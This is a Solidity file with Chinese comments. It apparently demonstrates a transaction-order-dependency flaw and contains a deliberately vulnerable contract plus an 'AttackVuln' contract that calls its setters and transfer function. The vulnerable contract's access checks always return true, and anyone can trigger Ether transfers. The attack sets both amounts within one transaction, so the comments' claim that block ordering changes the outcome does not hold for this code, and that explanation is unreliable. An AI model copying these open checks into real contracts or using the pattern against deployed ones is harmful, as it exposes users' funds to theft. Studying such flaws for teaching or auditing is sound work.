/*
 SPDX-License-Identifier: MIT

 此版本展示了 Transfer Amount Depending on Transaction Order 漏洞修復前的程式碼，並包含一個攻擊合約 AttackVuln，
 利用交易排序問題造成 Ether 轉帳金額異常的情形。
 編譯錯誤解決：將 AttackVuln 的 constructor 參數型別由 address 改為 address payable。
*/
pragma solidity >=0.8.0;

// 漏洞合約，存在交易排序可能導致 amount 被意外修改的問題
contract AmountSenderVuln {
    // 狀態變數 amount：記錄轉帳金額，漏洞在於此數值可能被多個交易操作影響
    uint public amount = 1;

    // 供應者操作，允許修改 amount
    function setAmountOp2(uint _amount) public {
        if (isProvider(msg.sender)) {
            // 此處漏洞：不受控的 amount 修改會受到交易順序影響
            amount = _amount;
        }
    }

    // 接收者操作，亦允許修改 amount
    function setAmountOp1(uint _amount) public {
        if (isRecipient(msg.sender)) {
            amount = _amount;
        }
    }

    // 簡化的供應者驗證，實際使用時會有複雜邏輯
    function isProvider(address sender) public pure returns (bool) {
        return true;
    }

    // 簡化的接收者驗證
    function isRecipient(address sender) public pure returns (bool) {
        return true;
    }

    // 轉帳函式，根據全域變數 amount 轉移 Ether，漏洞在於該數值可能已被修改
    function setTransferAmount() public {
        // 將 msg.sender 轉為 payable address 進行轉帳
        payable(msg.sender).transfer(amount);
    }

    // 允許合約接收 Ether
    receive() external payable {}
}

// 攻擊合約，利用交易排序問題進行攻擊
contract AttackVuln {
    AmountSenderVuln public target;

    // 修改 constructor 參數型別為 address payable 以避免類型轉換錯誤
    constructor(address payable _target) {
        target = AmountSenderVuln(_target);
    }

    // executeAttack 示範多步驟攻擊流程
    // 步驟說明：
    // 1. 以供應者身份呼叫 setAmountOp2 設定一個高額 (例如 1000)
    // 2. 然後以接收者身份呼叫 setAmountOp1 嘗試設定為 1，
    //    但區塊內交易排序可能使高額設定覆蓋較小數值，
    // 3. 最後呼叫 setTransferAmount 進行 Ether 轉帳，轉出的金額會依據異動後的 amount
    function executeAttack() public {
        // 步驟1：以供應者角色設定高額
        target.setAmountOp2(1000);

        // 步驟2：再以接收者角色嘗試設定較低金額
        target.setAmountOp1(1);

        // 步驟3：根據最終 amount 值轉帳給 msg.sender
        target.setTransferAmount();
    }

    // 允許合約接收 Ether
    receive() external payable {}
}
